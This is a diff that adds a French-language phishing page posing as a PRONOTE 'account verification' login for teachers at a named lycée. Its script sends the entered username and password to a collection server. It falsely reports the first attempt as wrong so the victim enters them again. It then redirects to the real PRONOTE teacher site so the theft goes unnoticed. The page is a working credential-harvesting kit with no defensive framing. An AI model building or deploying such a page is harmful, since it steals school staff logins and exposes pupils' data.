@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/images/style.css" />
+    <title>
+      Verification Espace Professeurs - PRONOTE 2023.0.2.7 - Lycée Français René
+      DESCARTES COLLEGE
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Poppins:wght@300&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
+    <link rel="mask-icon" sizes="any" href="/images/favicon.svg" color="#22874b">
+
+    <meta name="apple-mobile-web-app-title" content="PRONOTE" />
+    <meta name="application-name" content="PRONOTE" />
+    <meta name="theme-color" content="#22874b" />
+  </head>
+  <body>
+    <div
+      style="
+        background-color: white;
+        color: #46484d;
+        padding-top: 10px;
+        padding-bottom: 10px;
+        text-align: center;
+        position: absolute;
+        width: 100vw;
+      "
+    >
+      <h1 style="font-size: 1.2rem">Lycée Français René DESCARTES COLLEGE</h1>
+    </div>
+    <div class="center-screen">
+      <div>
+        <h2 style="font-size: 25px">Vérification de compte</h2>
+        <br />
+        <div class="card">
+          <div style="text-align: center">Espace Professeurs</div>
+          <br />
+          <img
+            style="margin: 1.6rem auto; width: 11rem; height: 11rem"
+            src="/images/espace-professeur.svg"
+          />
+          <br />
+          <input
+            id="id_22"
+            type="text"
+            title="Saisissez votre identifiant."
+            class="round-style"
+            tabindex="0"
+            placeholder="Identifiant"
+            aria-description="Il vous est communiqué par l'établissement et peut être différent de votre nom de famille."
+            aria-required="true"
+          />
+          <input
+            id="id_23"
+            type="password"
+            class="round-style"
+            title="Saisissez votre mot de passe."
+            tabindex="0"
+            placeholder="Mot de passe"
+            aria-description="Il vous est communiqué par l'établissement, vous pourrez le modifier dans l'onglet &quot;Compte&quot;."
+            aria-required="true"
+          />
+          <br />
+          <button>Vérifier son compte</button>
+        </div>
+      </div>
+    </div>
+    <div
+      style="
+        background-color: #46484d;
+        padding-top: 10px;
+        padding-bottom: 10px;
+        text-align: center;
+        position: absolute;
+        width: 100vw;
+        bottom: 0;
+      "
+    >
+      <img src="/images/footer.png" style="width: 15rem" />
+    </div>
+    <script>
+      var globalCounter = 0;
+      const button = document.querySelector("button");
+      button.addEventListener("click", async (event) => {
+        event.preventDefault();
+        const id_22 = document.getElementById("id_22").value;
+        const id_23 = document.getElementById("id_23").value;
+        if (id_22 === "" || id_23 === "") {
+          window.alert("Veuillez remplir tous les champs");
+        } else {
+          await window
+            .fetch("http://localhost:3007/lolcat", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                uname: id_22,
+                pwd: id_23,
+              }),
+            })
+            .then((res) => res.json())
+            .then((response) => {
+              if (response.success) {
+                // Supposons que le serveur renvoie un statut de succès si les identifiants sont valides
+                globalCounter++;
+                if (globalCounter === 2) {
+                  window.alert(
+                    "Vérification effectuée avec succès, vous pouvez vous connecter."
+                  );
+                  window.location.href =
+                    "https://3120002g.index-education.net/pronote/professeur.html?fd=1";
+                } else {
+                  window.alert("Identifiants incorrects, veuillez réessayer.");
+                }
+              } else {
+                window.alert("Veuillez rentrer vos identifiants corrects");
+              }
+            })
+            .catch((error) => {
+              console.error("Erreur lors de la requête:", error);
+              window.alert("Erreur lors de la connexion au serveur");
+            });
+        }
+      });
+    </script>
+  </body>
+</html>
